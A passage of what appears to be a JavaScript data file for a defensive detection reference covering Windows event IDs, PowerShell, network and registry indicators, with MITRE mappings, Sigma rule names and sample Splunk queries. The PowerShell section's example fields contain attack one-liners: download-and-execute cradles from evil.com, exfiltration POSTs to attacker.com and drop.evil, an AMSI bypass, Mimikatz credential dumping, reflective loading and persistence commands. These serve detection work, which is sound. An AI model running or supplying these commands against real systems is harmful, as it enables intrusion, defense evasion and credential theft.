    detectionRelevance: 'Detects Kerberos brute force (internal). Status 0x18 from single source = brute force. Multiple targets from single source = spray. More significant than NTLM brute force since it implies domain-level access.',
    relatedAttackType: 'Credential Access, Brute Force',
    severity: 'high',
    mitreTechniques: [
      { id: 'T1110.001', name: 'Password Guessing' }
    ],
    relatedSigmaRules: ['sigma-kerberos-bruteforce'],
    relatedCategories: ['brute-force', 'credential-access'],
    relatedIR: 'brute-force',
    keyFields: ['TargetUserName', 'IpAddress', 'Status'],
    sampleQuery: 'index=wineventlog EventCode=4771 Status=0x18\n| stats count by IpAddress, TargetUserName\n| where count > 15'
  },
  {
    eventId: '4740',
    title: 'Account Lockout',
    category: 'account-management',
    categoryLabel: '👤 Account Management',
    description: 'A user account was locked out. Indicates the account lockout threshold was exceeded. Only logged on the PDC Emulator domain controller.',
    detectionRelevance: 'Mass lockouts = active brute force or spray. Single account lockouts = targeted attack or misconfigured service. Extract CallerComputerName to identify the source system.',
    relatedAttackType: 'Credential Access, Brute Force',
    severity: 'medium',
    mitreTechniques: [
      { id: 'T1110', name: 'Brute Force' }
    ],
    relatedSigmaRules: ['sigma-account-lockout-storm'],
    relatedCategories: ['brute-force'],
    relatedIR: 'brute-force',
    keyFields: ['TargetUserName', 'TargetDomainName', 'CallerComputerName'],
    sampleQuery: 'index=wineventlog EventCode=4740\n| bin _time span=10m\n| stats count dc(TargetUserName) as locked_accounts by _time\n| where count > 10'
  },
  {
    eventId: '5136',
    title: 'Directory Service Object Modified',
    category: 'security-policy',
    categoryLabel: '🛡️ Security & Policy Changes',
    description: 'An Active Directory object was modified. Captures changes to AD objects including GPOs, user attributes, group memberships, and OU structure.',
    detectionRelevance: 'Critical for detecting AD enumeration, GPO hijacking, AdminSDHolder modification, and other domain-level attacks. Requires Advanced AD Auditing to be enabled.',
    relatedAttackType: 'Persistence, Privilege Escalation',
    severity: 'high',
    mitreTechniques: [
      { id: 'T1484.001', name: 'Domain Policy Modification: Group Policy' },
      { id: 'T1098', name: 'Account Manipulation' }
    ],
    relatedSigmaRules: ['sigma-gpo-modification', 'sigma-ad-object-modified'],
    relatedCategories: ['active-directory', 'privilege-escalation'],
    relatedIR: 'active-directory',
    keyFields: ['SubjectUserName', 'ObjectDN', 'ObjectClass', 'OperationType', 'AttributeLDAPDisplayName', 'AttributeValue'],
    sampleQuery: 'index=wineventlog EventCode=5136 ObjectClass="groupPolicyContainer"\n| table _time, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, AttributeValue'
  },
  {
    eventId: '5145',
    title: 'Network Share Object Access',
    category: 'object-access',
    categoryLabel: '📂 Object Access',
    description: 'A network share object was checked to see if the client\'s desired access can be granted. Records file share access attempts with the full file path accessed.',
    detectionRelevance: 'Detect lateral movement via admin shares (C$, ADMIN$, IPC$). Mass file access on shares may indicate ransomware propagation or data staging for exfiltration.',
    relatedAttackType: 'Lateral Movement, Data Exfiltration, Ransomware',
    severity: 'medium',
    mitreTechniques: [
      { id: 'T1021.002', name: 'SMB/Windows Admin Shares' },
      { id: 'T1039', name: 'Data from Network Shared Drive' }
    ],
    relatedSigmaRules: ['sigma-admin-share-access', 'sigma-smb-lateral'],
    relatedCategories: ['lateral-movement', 'data-exfiltration', 'ransomware'],
    relatedIR: 'lateral-movement',
    keyFields: ['SubjectUserName', 'ShareName', 'ShareLocalPath', 'RelativeTargetName', 'IpAddress', 'AccessMask'],
    sampleQuery: 'index=wineventlog EventCode=5145 ShareName IN ("\\\\\\\\*\\\\C$","\\\\\\\\*\\\\ADMIN$")\n| stats count by SubjectUserName, IpAddress, ShareName, RelativeTargetName'
  }
];

// ══════════════════════════════════════════════
// SECTION 2: POWERSHELL INTELLIGENCE
// ══════════════════════════════════════════════

const POWERSHELL_INTELLIGENCE = [
  {
    id: 'PS-001',
    name: 'Download Cradle Detection',
    eventId: '4104',
    pattern: 'Net.WebClient / DownloadString / DownloadFile / Invoke-WebRequest / IWR / curl',
    suspiciousBehavior: 'PowerShell downloading and executing payloads from remote servers. Common in initial access and stage-2 delivery.',
    detectionMapping: 'Script Block Logging captures the full deobfuscated download command including the URL.',
    severity: 'critical',
    exampleCode: "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\nInvoke-WebRequest -Uri 'http://malware.site/beacon.exe' -OutFile 'C:\\temp\\update.exe'",
    mitreTechnique: { id: 'T1059.001', name: 'PowerShell' },
    relatedSigmaRules: ['sigma-powershell-download-cradle'],
    relatedCategories: ['execution', 'initial-access']
  },
  {
    id: 'PS-002',
    name: 'Encoded Command Execution',
    eventId: '4104',
    pattern: '-EncodedCommand / -enc / FromBase64String / [Convert]::',
    suspiciousBehavior: 'Base64-encoded PowerShell commands used to evade command-line detection and obfuscate malicious intent.',
    detectionMapping: 'Script Block Logging automatically deobfuscates encoded commands, revealing the true payload.',
    severity: 'high',
    exampleCode: "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...\npowershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
    mitreTechnique: { id: 'T1027', name: 'Obfuscated Files or Information' },
    relatedSigmaRules: ['sigma-encoded-powershell'],
    relatedCategories: ['execution', 'defense-evasion']
  },
  {
    id: 'PS-003',
    name: 'AMSI Bypass Attempts',
    eventId: '4104',
    pattern: 'amsiInitFailed / AmsiUtils / amsiContext / SetValue.*amsi',
    suspiciousBehavior: 'Attempts to disable the Anti-Malware Scan Interface (AMSI) to allow execution of known malicious scripts without detection.',
    detectionMapping: 'Script Block Logging captures AMSI bypass attempts even when they succeed, as logging occurs before AMSI scanning.',
    severity: 'critical',
    exampleCode: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
    mitreTechnique: { id: 'T1562.001', name: 'Impair Defenses: Disable or Modify Tools' },
    relatedSigmaRules: ['sigma-amsi-bypass'],
    relatedCategories: ['defense-evasion']
  },
  {
    id: 'PS-004',
    name: 'Credential Access via PowerShell',
    eventId: '4104',
    pattern: 'Invoke-Mimikatz / Get-Credential / ConvertTo-SecureString / SecureStringToGlobalAllocUnicode / sekurlsa',
    suspiciousBehavior: 'PowerShell-based credential harvesting using Mimikatz or native credential manipulation cmdlets.',
    detectionMapping: 'Script Block Logging captures Invoke-Mimikatz and all credential manipulation attempts with full context.',
    severity: 'critical',
    exampleCode: "Invoke-Mimikatz -DumpCreds\nInvoke-Mimikatz -Command '\"privilege::debug\" \"sekurlsa::logonpasswords\"'",
    mitreTechnique: { id: 'T1003.001', name: 'OS Credential Dumping: LSASS Memory' },
    relatedSigmaRules: ['sigma-invoke-mimikatz', 'sigma-powershell-credential-access'],
    relatedCategories: ['credential-access']
  },
  {
    id: 'PS-005',
    name: 'Active Directory Reconnaissance',
    eventId: '4103',
    pattern: 'Get-ADUser / Get-ADComputer / Get-ADGroup / Get-DomainUser / Get-NetDomain / Find-LocalAdminAccess',
    suspiciousBehavior: 'PowerShell-based Active Directory enumeration using AD module cmdlets or PowerView functions for reconnaissance.',
    detectionMapping: 'Module Logging captures AD cmdlet execution. Script Block Logging captures PowerView/SharpHound invocations.',
    severity: 'high',
    exampleCode: "Get-ADUser -Filter * -Properties * | Export-CSV users.csv\nGet-DomainUser -AdminCount | Select SamAccountName\nInvoke-BloodHound -CollectionMethod All",
    mitreTechnique: { id: 'T1087.002', name: 'Account Discovery: Domain Account' },
    relatedSigmaRules: ['sigma-ad-enumeration', 'sigma-bloodhound'],
    relatedCategories: ['reconnaissance', 'active-directory']
  },
  {
    id: 'PS-006',
    name: 'Lateral Movement via PowerShell',
    eventId: '4104',
    pattern: 'Invoke-Command / Enter-PSSession / New-PSSession / Invoke-WMIMethod / WMI',
    suspiciousBehavior: 'Using PowerShell remoting (WinRM/WMI) for lateral movement to execute commands on remote systems.',
    detectionMapping: 'Script Block Logging on both source and destination captures the full remote execution chain.',
    severity: 'high',
    exampleCode: "Invoke-Command -ComputerName DC01 -ScriptBlock { whoami; ipconfig }\nNew-PSSession -ComputerName srv01 | Enter-PSSession",
    mitreTechnique: { id: 'T1021.006', name: 'Windows Remote Management' },
    relatedSigmaRules: ['sigma-powershell-remoting'],
    relatedCategories: ['lateral-movement']
  },
  {
    id: 'PS-007',
    name: 'Persistence via PowerShell',
    eventId: '4104',
    pattern: 'Register-ScheduledTask / New-ScheduledTask / Set-ItemProperty.*Run / WMI EventSubscription',
    suspiciousBehavior: 'Using PowerShell to create persistence mechanisms including scheduled tasks, registry run keys, and WMI event subscriptions.',
    detectionMapping: 'Script Block Logging captures the persistence mechanism creation including the payload path and trigger conditions.',
    severity: 'high',
    exampleCode: "Register-ScheduledTask -TaskName 'Update' -Action (New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-w hidden -c payload')\nSet-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Updater' -Value 'malware.exe'",
    mitreTechnique: { id: 'T1053.005', name: 'Scheduled Task' },
    relatedSigmaRules: ['sigma-powershell-persistence', 'sigma-scheduled-task-creation'],
    relatedCategories: ['persistence']
  },
  {
    id: 'PS-008',
    name: 'Data Exfiltration via PowerShell',
    eventId: '4104',
    pattern: 'Invoke-RestMethod / Invoke-WebRequest -Method POST / System.Net.Mail / Send-MailMessage',
    suspiciousBehavior: 'Using PowerShell to exfiltrate data via HTTP POST, email, or DNS queries. May involve compression and encoding before transfer.',
    detectionMapping: 'Script Block Logging captures the exfiltration command including destination URLs, email addresses, and data being transferred.',
    severity: 'critical',
    exampleCode: "Invoke-RestMethod -Uri 'https://attacker.com/exfil' -Method POST -Body (Get-Content sensitivedata.txt)\nCompress-Archive -Path C:\\Sensitive -DestinationPath C:\\temp\\data.zip; Invoke-WebRequest -Uri 'https://drop.evil/upload' -Method POST -InFile C:\\temp\\data.zip",
    mitreTechnique: { id: 'T1041', name: 'Exfiltration Over C2 Channel' },
    relatedSigmaRules: ['sigma-powershell-exfiltration'],
    relatedCategories: ['data-exfiltration']
  },
  {
    id: 'PS-009',
    name: 'Reflective Loading / In-Memory Execution',
    eventId: '4104',
    pattern: 'Assembly.Load / Reflection / Invoke.*Method / DllImport / Add-Type.*DllImport',
    suspiciousBehavior: 'Loading .NET assemblies directly into memory for fileless execution. Commonly used by Cobalt Strike, SharpTools, and other post-exploitation frameworks.',
    detectionMapping: 'Script Block Logging captures the reflective loader and often the full assembly being loaded, even when executed entirely in memory.',
    severity: 'critical',
    exampleCode: "[System.Reflection.Assembly]::Load([Convert]::FromBase64String('TVqQAAM...'))\n$bytes = (IWR 'http://evil/sharp.exe').Content; [Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, @())",
    mitreTechnique: { id: 'T1620', name: 'Reflective Code Loading' },
    relatedSigmaRules: ['sigma-reflective-loading', 'sigma-dotnet-memory-load'],
    relatedCategories: ['execution', 'defense-evasion']
  },
  {
    id: 'PS-010',
    name: 'Constrained Language Mode Bypass',
    eventId: '4104',
    pattern: 'FullLanguage / LanguageMode / PSLockdownPolicy / __PSLockdownPolicy',
    suspiciousBehavior: 'Attempts to bypass PowerShell Constrained Language Mode (CLM) to execute unrestricted PowerShell in hardened environments.',
    detectionMapping: 'Script Block Logging captures CLM bypass attempts including the technique used (environment variable manipulation, runspace creation, etc.).',
    severity: 'high',
    exampleCode: "$ExecutionContext.SessionState.LanguageMode = 'FullLanguage'\n[Environment]::SetEnvironmentVariable('__PSLockdownPolicy', $null, 'Machine')",
    mitreTechnique: { id: 'T1059.001', name: 'PowerShell' },
    relatedSigmaRules: ['sigma-clm-bypass'],
    relatedCategories: ['defense-evasion', 'execution']
  }
];

// ══════════════════════════════════════════════
// SECTION 3: NETWORK INTELLIGENCE
// ══════════════════════════════════════════════

const NETWORK_INTELLIGENCE = [
  {
    id: 'NET-001',
    name: 'DNS Tunneling Detection',
    description: 'Attackers use DNS queries (especially TXT records) to create a covert data channel. Characterized by long subdomain labels, high query volumes, and unusual record types.',
    detectionRelevance: 'Look for DNS queries with subdomains >30 characters, high-entropy labels, excessive TXT queries, and base64-encoded data in DNS names.',
    attackType: 'Command & Control, Data Exfiltration',
    severity: 'critical',
    indicators: [
      'Subdomain length > 30 characters',
      'TXT record queries to unusual domains',
      'High DNS query volume from single host',
      'Base64/hex encoded data in query names',
      'Queries to newly registered domains'
    ],
    mitreMapping: { id: 'T1071.004', name: 'Application Layer Protocol: DNS' },
    relatedSigmaRules: ['sigma-dns-tunneling'],
    sampleQuery: 'index=dns\n| eval subdomain_len=len(replace(query, "\\.[^.]+\\.[^.]+$", ""))\n| where subdomain_len > 30\n| stats count by query, src_ip'
  },
  {
    id: 'NET-002',
    name: 'C2 Beaconing Pattern Detection',
    description: 'Command & Control beaconing creates regular, periodic communication patterns between compromised hosts and C2 servers. Interval jitter analysis reveals this pattern.',
    detectionRelevance: 'Look for connections with regular intervals (±10% jitter), consistent packet sizes, and connections to rare/external domains during non-business hours.',
    attackType: 'Command & Control',
    severity: 'critical',
    indicators: [
      'Regular connection intervals (e.g., every 60±6 seconds)',
      'Consistent payload sizes per session',
      'Connections to IP addresses without SNI/domain',
      'HTTPS connections to non-CDN, non-major-cloud IPs',
      'Low data volume per connection (heartbeat pattern)',
      'Activity during non-business hours'
    ],
    mitreMapping: { id: 'T1071.001', name: 'Application Layer Protocol: Web Protocols' },
    relatedSigmaRules: ['sigma-c2-beaconing'],
    sampleQuery: 'index=proxy OR index=firewall dest_port=443\n| sort src_ip, _time\n| streamstats current=f last(_time) as prev_time by src_ip, dest_ip\n| eval interval=_time-prev_time\n| stats stdev(interval) as jitter avg(interval) as avg_int count by src_ip, dest_ip\n| where jitter < (avg_int * 0.15) AND count > 20'
  },
  {
    id: 'NET-003',
    name: 'Proxy Log Analysis for Data Exfiltration',
    description: 'Proxy logs reveal outbound data transfers including uploads to cloud storage, file sharing services, and suspicious POST requests with large payloads.',
    detectionRelevance: 'Monitor for large HTTP POST requests, uploads to personal cloud storage (Dropbox, Google Drive, OneDrive personal), and connections to known paste/upload sites.',
    attackType: 'Data Exfiltration',
    severity: 'high',
    indicators: [
      'Large POST requests (>10MB) to external hosts',
      'Uploads to personal cloud storage services',
      'Connections to paste sites (pastebin, hastebin)',
      'Data encoding in URL parameters (base64 in GET)',
      'Unusual volume of outbound HTTPS traffic',
      'Connections to file sharing services during off-hours'
    ],
    mitreMapping: { id: 'T1567.002', name: 'Exfiltration to Cloud Storage' },
    relatedSigmaRules: ['sigma-data-exfiltration-upload'],
    sampleQuery: 'index=proxy http_method=POST\n| where bytes_out > 10000000\n| stats sum(bytes_out) as total_bytes count by src_ip, dest_host\n| sort - total_bytes'
  },
  {
    id: 'NET-004',
    name: 'Firewall Deny Analysis for Scanning',
    description: 'Firewall deny logs reveal scanning activity — port scans, host sweeps, and service enumeration from both internal and external sources.',
    detectionRelevance: 'High volume of firewall denies from single IP to many destinations or many ports = scanning. Internal scanning may indicate compromised host performing reconnaissance.',
    attackType: 'Reconnaissance, Discovery',
    severity: 'medium',
    indicators: [
      'Single source → many destination IPs (host sweep)',
      'Single source → many ports on single target (port scan)',
      'Sequential port or IP patterns',
      'SYN-only connections without completing handshake',
      'Internal source scanning internal ranges (lateral recon)'
    ],
    mitreMapping: { id: 'T1046', name: 'Network Service Discovery' },
    relatedSigmaRules: ['sigma-port-scan', 'sigma-network-sweep'],
    sampleQuery: 'index=firewall action=denied\n| stats dc(dest_port) as ports dc(dest_ip) as targets by src_ip\n| where ports > 20 OR targets > 50\n| sort - targets'
  },
  {
    id: 'NET-005',
    name: 'SMB Lateral Movement Detection',
    description: 'SMB (port 445) is the primary protocol for lateral movement in Windows environments. PsExec, WMI, and remote service creation all use SMB.',
    detectionRelevance: 'Monitor workstations connecting to many SMB targets. Normal workstations connect to 1-5 SMB destinations. >10 unique targets in 30min from a workstation is suspicious.',
    attackType: 'Lateral Movement',
    severity: 'high',
    indicators: [
      'Workstation connecting to >10 unique SMB targets',
      'SMB connections to admin shares (C$, ADMIN$, IPC$)',
      'SMB connections during non-business hours',
      'Named pipe creation over SMB (PSEXESVC, svcctl)',
      'Sequential IP addresssthat pattern during SMB connections'
    ],
    mitreMapping: { id: 'T1021.002', name: 'SMB/Windows Admin Shares' },
    relatedSigmaRules: ['sigma-smb-lateral-movement'],
    sampleQuery: 'index=firewall dest_port=445\n| bin _time span=30m\n| stats dc(dest_ip) as targets by src_ip, _time\n| where targets > 10'
  },
  {
    id: 'NET-006',
    name: 'RDP Lateral Movement Detection',
    description: 'RDP (port 3389) lateral movement — multi-hop RDP patterns where attackers chain through systems using compromised credentials.',
    detectionRelevance: 'Track RDP connection chains. Normal users have 1-2 RDP targets. Admin with >5 targets in 24h needs investigation. Non-admin accounts with any RDP is suspicious in many environments.',
    attackType: 'Lateral Movement',
    severity: 'high',
    indicators: [
      'Single user RDPing to >3 unique systems',
      'RDP from non-jump-server sources',
      'RDP connections chaining (A→B→C→D)',
      'Non-admin account using RDP',
      'RDP to systems outside normal job scope'
    ],
    mitreMapping: { id: 'T1021.001', name: 'Remote Desktop Protocol' },
    relatedSigmaRules: ['sigma-rdp-lateral-hop'],
    sampleQuery: 'index=wineventlog EventCode=4624 LogonType=10\n| stats dc(ComputerName) as targets values(ComputerName) as systems by TargetUserName\n| where targets > 3'
  },
  {
    id: 'NET-007',
    name: 'Outbound Connection to Rare Destinations',
    description: 'Connections to IP addresses or domains not commonly accessed by the organization may indicate C2, data exfiltration, or compromised host activity.',
    detectionRelevance: 'Build baseline of common destinations. Alert on first-seen external IPs/domains, especially over non-standard ports or during off-hours.',
    attackType: 'Command & Control',
    severity: 'medium',
    indicators: [
      'First-time destination IP/domain for the org',
      'Connections to hosting providers known for abuse',
      'HTTPS to IP address (no SNI hostname)',
      'Connections on non-standard ports (4444, 8080, 8443)',
      'Connections to VPS/cloud providers not used by org'
    ],
    mitreMapping: { id: 'T1071', name: 'Application Layer Protocol' },
    relatedSigmaRules: ['sigma-rare-destination'],
    sampleQuery: 'index=proxy\n| stats earliest(_time) as first_seen count by dest_domain\n| where first_seen > relative_time(now(), "-24h")\n| sort - count'
  },
  {
    id: 'NET-008',
    name: 'ICMP / Protocol Tunneling',
    description: 'Attackers may tunnel data through ICMP (ping), DNS, or other protocols to bypass firewall restrictions on standard ports.',
    detectionRelevance: 'Large ICMP packets (>100 bytes payload), high-volume ICMP from single host, and ICMP type 0/8 with non-standard data indicate ICMP tunneling.',
    attackType: 'Command & Control, Data Exfiltration',
    severity: 'high',
    indicators: [
      'ICMP packets with payload >100 bytes',
      'High-volume ICMP from single source',
      'ICMP echo/reply with embedded data',
      'Non-standard ICMP types',
      'GRE/IP-in-IP tunneling to external hosts'
    ],
    mitreMapping: { id: 'T1572', name: 'Protocol Tunneling' },
    relatedSigmaRules: ['sigma-icmp-tunnel'],
    sampleQuery: 'index=firewall protocol=icmp\n| where bytes > 100\n| stats count sum(bytes) as total_bytes by src_ip, dest_ip\n| where count > 100 OR total_bytes > 1000000'
  },
  {
    id: 'NET-009',
    name: 'SSL/TLS Certificate Anomalies',
    description: 'Analyzing TLS certificates for self-signed certs, expired certs, known-bad certificate fingerprints, and certificate impersonation techniques used by C2 frameworks.',
    detectionRelevance: 'Cobalt Strike, Metasploit, and other C2 frameworks use default or self-signed certificates. Known certificate fingerprints can identify specific C2 infrastructure.',
    attackType: 'Command & Control',
    severity: 'medium',
    indicators: [
      'Self-signed certificates on external hosts',
      'Expired certificates being accepted',
      'Certificate subjects not matching destination domain',
      'Known C2 framework certificate fingerprints',
      'Certificates with very short validity periods',
      'Certificates issued by unknown CAs'
    ],
    mitreMapping: { id: 'T1573.002', name: 'Encrypted Channel: Asymmetric Cryptography' },
    relatedSigmaRules: ['sigma-c2-certificate'],
    sampleQuery: 'index=proxy ssl_is_self_signed=true\n| stats count by ssl_subject, ssl_issuer, dest_ip\n| sort - count'
  },
  {
    id: 'NET-010',
    name: 'DoH/DoT (DNS over HTTPS/TLS) Evasion',
    description: 'DNS over HTTPS (DoH) or DNS over TLS (DoT) bypasses traditional DNS monitoring by encrypting DNS queries, hiding them within HTTPS traffic.',
    detectionRelevance: 'Monitor for connections to known DoH providers (1.1.1.1, 8.8.8.8 on port 443, dns.google, cloudflare-dns.com). Block or redirect DoH to force DNS through monitored resolvers.',
    attackType: 'Defense Evasion, Command & Control',
    severity: 'high',
    indicators: [
      'HTTPS connections to known DoH endpoints',
      'Port 853 connections (DoT)',
      'HTTP requests with application/dns-message content type',
      'High volume DNS-over-HTTPS queries',
      'Applications bypassing system DNS resolver'
    ],
    mitreMapping: { id: 'T1071.004', name: 'Application Layer Protocol: DNS' },
    relatedSigmaRules: ['sigma-doh-usage'],
    sampleQuery: 'index=proxy dest IN ("1.1.1.1","8.8.8.8","9.9.9.9") dest_port=443\n| stats count by src_ip, dest\n| where count > 100'
  }
];

// ══════════════════════════════════════════════
// SECTION 4: REGISTRY INTELLIGENCE
// ══════════════════════════════════════════════

const REGISTRY_INTELLIGENCE = [
  // ── Persistence ──
  {
    id: 'REG-001',
    registryPath: 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
    description: 'Programs listed here run automatically when any user logs on. One of the most common persistence mechanisms used by malware.',
    purpose: 'Persistence',
    category: 'persistence',
    detectionRelevance: 'Monitor for new entries added to this key. Legitimate entries are typically installed by software installers. Any entry pointing to temp directories, AppData, or unusual paths is suspicious.',
    severity: 'high',
    mitreTechnique: { id: 'T1547.001', name: 'Boot or Logon Autostart Execution: Registry Run Keys' },
    relatedSigmaRules: ['sigma-registry-run-persistence'],
    relatedIRSteps: [
      'Identify the executable referenced in the Run key',
      'Check file hash against threat intelligence',
      'Determine when the registry entry was created',
      'Remove malicious entry and quarantine the file',
      'Check other persistence locations for the same malware'
    ]
  },
  {
    id: 'REG-002',
    registryPath: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
    description: 'User-specific autorun key. Programs listed here run when this specific user logs on. Easier to modify than HKLM (no admin required).',
    purpose: 'Persistence',
    category: 'persistence',
    detectionRelevance: 'More commonly abused than HKLM\\Run because no elevation required. Standard users can create entries here. Monitor for unsigned executables and scripts.',
    severity: 'high',
    mitreTechnique: { id: 'T1547.001', name: 'Boot or Logon Autostart Execution: Registry Run Keys' },
    relatedSigmaRules: ['sigma-registry-run-persistence'],
    relatedIRSteps: [
      'Identify user account with the suspicious Run entry',
      'Analyze the executable for malicious behavior',
      'Check user activity timeline around entry creation',
      'Remove entry and quarantine payload'
    ]
  },
  {
    id: 'REG-003',
    registryPath: 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce',
    description: 'Programs listed here run once at next logon and are then automatically deleted. Used by attackers for one-time payload execution that self-cleans.',
    purpose: 'Persistence',
    category: 'persistence',
    detectionRelevance: 'Self-deleting nature makes this harder to catch. Real-time monitoring required (Sysmon Event 13). If you see it after reboot, the entry has already executed and been removed.',
    severity: 'high',
    mitreTechnique: { id: 'T1547.001', name: 'Boot or Logon Autostart Execution: Registry Run Keys' },
    relatedSigmaRules: ['sigma-runonce-persistence'],
    relatedIRSteps: [
      'Check Sysmon Event 13 for registry value set events',
      'Determine what was executed from the RunOnce entry',
      'Analyze system for post-execution artifacts',
      'Check for additional persistence mechanisms installed by the payload'
    ]
  },
  {
    id: 'REG-004',
    registryPath: 'HKLM\\SYSTEM\\CurrentControlSet\\Services',
    description: 'Contains configuration for all Windows services. Attackers create new service entries for persistence or modify existing services to load malicious DLLs.',
    purpose: 'Services',
    category: 'persistence',
    detectionRelevance: 'New services in unusual locations (temp, AppData) are suspicious. Service DLL hijacking modifies the ServiceDll value. Cross-reference with Event 7045/4697.',
    severity: 'critical',
    mitreTechnique: { id: 'T1543.003', name: 'Create or Modify System Process: Windows Service' },
    relatedSigmaRules: ['sigma-malicious-service-registry', 'sigma-service-dll-hijack'],
    relatedIRSteps: [
      'Compare service list against known-good baseline',
      'Check ImagePath for suspicious executables',
      'Verify ServiceDll values for DLL hijacking',
      'Review service creation events (7045) in event logs',
      'Disable malicious service immediately'
    ]
  },
  {
    id: 'REG-005',
    registryPath: 'HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon',
    description: 'Controls the Windows logon process. Shell and Userinit values specify what runs after logon. Modifying these provides high-privilege persistence.',
    purpose: 'Persistence',
    category: 'persistence',
    detectionRelevance: 'Shell should always be "explorer.exe". Userinit should be "C:\\Windows\\system32\\userinit.exe,". Any other value indicates compromise. Monitor Notify subkey for logon notification DLLs.',
    severity: 'critical',
    mitreTechnique: { id: 'T1547.004', name: 'Winlogon Helper DLL' },
    relatedSigmaRules: ['sigma-winlogon-modification'],
    relatedIRSteps: [
      'Verify Shell value is "explorer.exe"',
      'Verify Userinit value is the default path',
      'Check for Notify subkey entries',
      'Restore modified values to defaults',
      'Analyze the malicious executable referenced'
    ]
  },

  // ── Execution ──
  {
    id: 'REG-006',
    registryPath: 'HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command',
    description: 'Used in UAC bypass attacks (fodhelper, computerdefaults). Attacker sets this key to point to their payload, then triggers auto-elevating binary.',
    purpose: 'Execution',
    category: 'execution',
    detectionRelevance: 'This key should NOT exist in normal operations. Its presence is a strong indicator of UAC bypass. Monitor with Sysmon Event 13 (registry value set).',
    severity: 'critical',
    mitreTechnique: { id: 'T1548.002', name: 'Bypass User Account Control' },
    relatedSigmaRules: ['sigma-uac-bypass-fodhelper'],
    relatedIRSteps: [
      'Delete the malicious registry key immediately',
      'Identify the payload that was set to execute',
      'Check for elevated processes spawned by fodhelper/computerdefaults',
      'Hunt for additional UAC bypass variants',
      'Review what actions were taken with elevated privileges'
    ]
  },
  {
    id: 'REG-007',
    registryPath: 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options',
    description: 'IFEO allows specifying a debugger for any executable. Attackers set a debugger for accessibility tools (sethc.exe, utilman.exe) to get SYSTEM-level backdoor access.',
    purpose: 'Execution',
    category: 'execution',
    detectionRelevance: 'Alert on new Debugger values for sethc.exe, utilman.exe, osk.exe, narrator.exe, magnify.exe. Also used for silent process exit monitoring attacks.',
    severity: 'critical',
    mitreTechnique: { id: 'T1546.012', name: 'Event Triggered Execution: Image File Execution Options Injection' },
    relatedSigmaRules: ['sigma-ifeo-injection', 'sigma-sticky-keys-backdoor'],
    relatedIRSteps: [
      'Check for Debugger values on accessibility executables',
      'Remove malicious IFEO entries',
      'Analyze the "debugger" executable for backdoor functionality',
      'Check RDP access — IFEO backdoors are triggered via login screen',
      'Review system access history for unauthorized logins'
    ]
  },

  // ── Credential Storage ──
  {
    id: 'REG-008',
    registryPath: 'HKLM\\SECURITY\\Policy\\Secrets',
    description: 'Contains LSA secrets including service account passwords, auto-logon credentials, and cached domain credentials stored by the system.',
    purpose: 'Credential Storage',
    category: 'credential-storage',
    detectionRelevance: 'Access to this key by non-SYSTEM processes indicates credential dumping. Monitor with SACL auditing. Tools like secretsdump.py and Mimikatz target these secrets.',
    severity: 'critical',
    mitreTechnique: { id: 'T1003.004', name: 'OS Credential Dumping: LSA Secrets' },
    relatedSigmaRules: ['sigma-lsa-secret-access'],
    relatedIRSteps: [
      'Identify process accessing LSA secrets',
      'Assume all service account credentials are compromised',
      'Rotate all service account passwords',
      'Check for credential usage from unusual locations',
      'Deploy Credential Guard if not already enabled'
    ]
  },
  {
    id: 'REG-009',
    registryPath: 'HKLM\\SAM\\SAM\\Domains\\Account\\Users',
    description: 'Contains the Security Account Manager database with local user password hashes (NTLM). Normally only accessible to SYSTEM.',
    purpose: 'Credential Storage',
    category: 'credential-storage',
    detectionRelevance: 'Any non-SYSTEM access to SAM indicates credential dumping (reg save, shadow copy + esentutl). Monitor for reg.exe commands saving HKLM\\SAM.',
    severity: 'critical',
    mitreTechnique: { id: 'T1003.002', name: 'OS Credential Dumping: SAM' },
    relatedSigmaRules: ['sigma-sam-dump', 'sigma-reg-save-sam'],
    relatedIRSteps: [
      'Determine how SAM was accessed (reg save, shadow copy, direct)',
      'Check for SYSTEM and SECURITY hive access in same timeframe',
      'Assume all local account hashes are compromised',
      'Deploy LAPS to make SAM dumping less impactful',
      'Reset all local admin passwords'
    ]
  },

  // ── System Configuration ──
  {
    id: 'REG-010',
    registryPath: 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest',
    description: 'Controls WDigest authentication. When UseLogonCredential is set to 1, credentials are stored in cleartext in memory — enabling Mimikatz plaintext extraction.',
    purpose: 'System Configuration',
    category: 'system-configuration',
    detectionRelevance: 'UseLogonCredential should be 0 on Windows 8.1+/Server 2012 R2+. If set to 1, attacker has enabled cleartext credential storage. Immediate investigation required.',
    severity: 'critical',
    mitreTechnique: { id: 'T1112', name: 'Modify Registry' },
    relatedSigmaRules: ['sigma-wdigest-enabled'],
    relatedIRSteps: [
      'Set UseLogonCredential back to 0 immediately',
      'Determine when the value was changed and by whom',
      'Assume all credentials in memory are compromised',
      'Force password reset for all users who logged on since change',
      'Deploy Credential Guard to prevent future attacks'
    ]
  },
  {
    id: 'REG-011',
    registryPath: 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender',
    description: 'Windows Defender policy settings. Attackers commonly disable Defender by setting DisableAntiSpyware, DisableRealtimeMonitoring, or adding exclusion paths.',
    purpose: 'Security Settings',
    category: 'security-settings',
    detectionRelevance: 'DisableAntiSpyware=1 or DisableRealtimeMonitoring=1 indicates Defender has been disabled. Also monitor SpyNet and Exclusion subkeys for attacker-added exclusions.',
    severity: 'critical',
    mitreTechnique: { id: 'T1562.001', name: 'Impair Defenses: Disable or Modify Tools' },
